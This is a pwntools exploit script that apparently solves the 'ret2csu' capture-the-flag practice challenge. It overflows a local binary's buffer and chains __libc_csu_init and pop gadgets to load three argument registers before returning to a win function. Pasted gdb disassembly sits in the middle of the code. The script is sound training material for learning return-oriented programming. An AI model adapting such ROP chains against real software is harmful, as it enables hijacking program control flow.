import pwn
offset=40
ret2win_plt=0x0000000000400510
target=pwn.process("./ret2csu")
gdbscript='''b *0x0000000000400510'''
pid = pwn.gdb.attach(target, gdbscript=gdbscript)
payload=b''
payload+=b'A'*offset
payload+=pwn.p64(0x0040069a)#pop rbx;pop rbp;pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload+=pwn.p64(0)
payload+=pwn.p64(1)#not jump in 0x400694
payload+=pwn.p64(0x4003b0)#point to 0x04006b4:sub rsp, 8 ; add rsp, 8 ; ret
payload+=pwn.p64(0)
payload+=pwn.p64(0)
payload+=pwn.p64(0xd00df00dd00df00d)
payload+=pwn.p64(0x00400676)#libc_csu_init:xor ebx;ebx; nop DWORD PTR [rax+rax*1+0x0];mov rdx,r15 ; mov rsi, r14; mov edi,r13; call qword ptr [R12 + RBX*0x8]
'''
     0x4006b4 <_fini+0>        sub    rsp, 0x8
     0x4006b8 <_fini+4>        add    rsp, 0x8
 →   0x4006bc <_fini+8>        ret    
   ↳    0x40068d <__libc_csu_init+77> add    rbx, 0x1
        0x400691 <__libc_csu_init+81> cmp    rbp, rbx
        0x400694 <__libc_csu_init+84> jne    0x400680 <__libc_csu_init+64>
        0x400696 <__libc_csu_init+86> add    rsp, 0x8
        0x40069a <__libc_csu_init+90> pop    rbx
        0x40069b <__libc_csu_init+91> pop    rbp
'''
payload+=pwn.p64(0)*7 #pop 6 times at 0x0040069a :)))
payload+=pwn.p64(0x00000000004006a3)# pop rdi;ret
payload+=pwn.p64(0xdeadbeefdeadbeef)
payload+=pwn.p64(0x00000000004006a1)#pop rsi;pop r15;ret
payload+=pwn.p64(0xcafebabecafebabe)
payload+=pwn.p64(0)
payload+=pwn.p64(ret2win_plt)
target.sendline(payload)
target.interactive()
